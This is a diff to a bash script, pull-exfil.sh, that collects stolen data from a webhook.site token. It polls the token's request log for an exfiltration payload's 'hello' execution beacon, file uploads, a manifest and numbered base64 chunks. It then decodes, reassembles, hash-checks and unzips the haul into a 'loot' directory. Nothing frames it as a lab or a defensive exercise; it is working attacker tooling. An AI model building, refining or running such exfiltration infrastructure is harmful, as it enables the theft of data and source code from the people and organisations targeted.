@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 #
-# pull-exfil.sh — reassemble a chunked exfil upload from a webhook.site token.
+# pull-exfil.sh — collect and reassemble an exfil run from a webhook.site token.
 #
 #   ./pull-exfil.sh <token-uuid> [outdir]
 #
-# The exfil payload POSTs a manifest, numbered base64 chunks, then "done".
-# This polls the token's request log, waits for the terminator, concatenates the
-# chunks in order, verifies the SHA-256 from the manifest, and unzips.
+# Endpoints written by the payload: hello, f-<name>, manifest, c<i>, done.
+# Small artifacts are written decoded; chunked blobs are concatenated, verified
+# against the manifest SHA-256, and extracted.
 
 set -uo pipefail
 
@@ -17,46 +17,80 @@ OUT="${2:-loot}"
 API="https://webhook.site/token/$TOKEN/requests"
 PY="${PYTHON:-python3}"
 
-mkdir -p "$OUT"
-echo "[*] polling $API (Ctrl-C to stop)"
+mkdir -p "$OUT/files"
+echo "[*] polling (Ctrl-C to stop) — watching for 'hello'"
+echo "[*] dashboard: https://webhook.site/#!/$TOKEN"
 
+hello=0
 for attempt in $(seq 1 120); do
-  "$PY" - "$API" "$OUT" <<'PY'
-import base64, json, os, sys, urllib.request
+  res=$("$PY" - "$API" "$OUT" <<'PY'
+import json, os, sys, urllib.request
 
 api, out = sys.argv[1], sys.argv[2]
 try:
-    with urllib.request.urlopen(api + "?sorting=newest&per_page=200", timeout=20) as r:
-        data = json.load(r)
+    req = urllib.request.Request(api + "?sorting=newest", headers={"Accept": "application/json"})
+    with urllib.request.urlopen(req, timeout=25) as r:
+        raw = r.read()
+    data = json.loads(raw) if raw.strip() else {}
 except Exception as e:
-    print("  poll error:", e); raise SystemExit(0)
+    print("ERR " + type(e).__name__)
+    raise SystemExit(0)
 
-reqs = data.get("data") or []
-seen = set()
-for q in reqs:
+new = 0
+for q in (data.get("data") or []):
     path = (q.get("url") or "").rstrip("/").split("/")[-1]
     body = q.get("content") or ""
-    if path == "manifest":
-        open(os.path.join(out, "manifest.txt"), "w").write(body)
+    if not path:
+        continue
+    if path == "hello":
+        p = os.path.join(out, "hello.txt")
+        if not os.path.exists(p):
+            open(p, "w").write(body); new += 1; print("HELLO")
+    elif path.startswith("f-"):
+        p = os.path.join(out, "files", path[2:] + ".b64")
+        if not os.path.exists(p):
+            open(p, "w").write(body); new += 1
+    elif path == "manifest":
+        p = os.path.join(out, "manifest.txt")
+        if not os.path.exists(p):
+            open(p, "w").write(body); new += 1
     elif path == "done":
-        open(os.path.join(out, ".done"), "w").write("1")
+        p = os.path.join(out, ".done")
+        if not os.path.exists(p):
+            open(p, "w").write("1"); new += 1; print("DONE")
     elif path.startswith("c") and path[1:].isdigit():
         p = os.path.join(out, "chunk-%05d.b64" % int(path[1:]))
         if not os.path.exists(p):
-            open(p, "w").write(body)
-            seen.add(path)
-if seen:
-    print("  +%d chunk(s)" % len(seen))
+            open(p, "w").write(body); new += 1
+if new:
+    print("NEW %d" % new)
 PY
-
-  if [ -f "$OUT/.done" ]; then
-    echo "[+] transfer complete"
-    break
-  fi
+)
+  case "$res" in
+    *ERR*) echo "  $res" ;;
+    *HELLO*) hello=1; echo "[+] payload executed — beacon received" ;;
+    *NEW*) echo "  $res" ;;
+  esac
+  [ -f "$OUT/.done" ] && { echo "[+] transfer complete"; break; }
   sleep 5
 done
 
-[ -f "$OUT/.done" ] || { echo "[!] timed out waiting for 'done'" >&2; exit 1; }
+if [ -f "$OUT/hello.txt" ]; then
+  echo "[*] hello: $(cat "$OUT/hello.txt")"
+else
+  echo "[!] no hello beacon — payload may not have executed, or egress is blocked" >&2
+fi
+
+# decode small artifacts
+for b in "$OUT"/files/*.b64; do
+  [ -e "$b" ] || continue
+  "$PY" -c "import base64,sys,os;d=open(sys.argv[1]).read();open(sys.argv[1][:-4],'wb').write(base64.b64decode(d))" "$b" 2>/dev/null
+done
+
+if ! ls "$OUT"/chunk-*.b64 >/dev/null 2>&1; then
+  echo "[!] no chunks — nothing to reassemble" >&2
+  exit 1
+fi
 
 cat "$OUT"/chunk-*.b64 > "$OUT/src.b64"
 "$PY" - "$OUT" <<'PY'
@@ -68,9 +102,8 @@ print("[*] bytes:", len(raw))
 man = open(os.path.join(out, "manifest.txt")).read()
 for kv in man.split("&"):
     if kv.startswith("sha="):
-        want = kv[4:]
-        got = hashlib.sha256(raw).hexdigest().upper()
-        print("[*] sha256:", "MATCH" if got == want.upper() else "MISMATCH")
+        want, got = kv[4:].upper(), hashlib.sha256(raw).hexdigest().upper()
+        print("[*] sha256:", "MATCH" if got == want else "MISMATCH")
 PY
 
-cd "$OUT" && unzip -o -q src.zip -d src 2>/dev/null && echo "[+] extracted to $OUT/src"
+(cd "$OUT" && unzip -o -q src.zip -d src 2>/dev/null && echo "[+] extracted to $OUT/src")
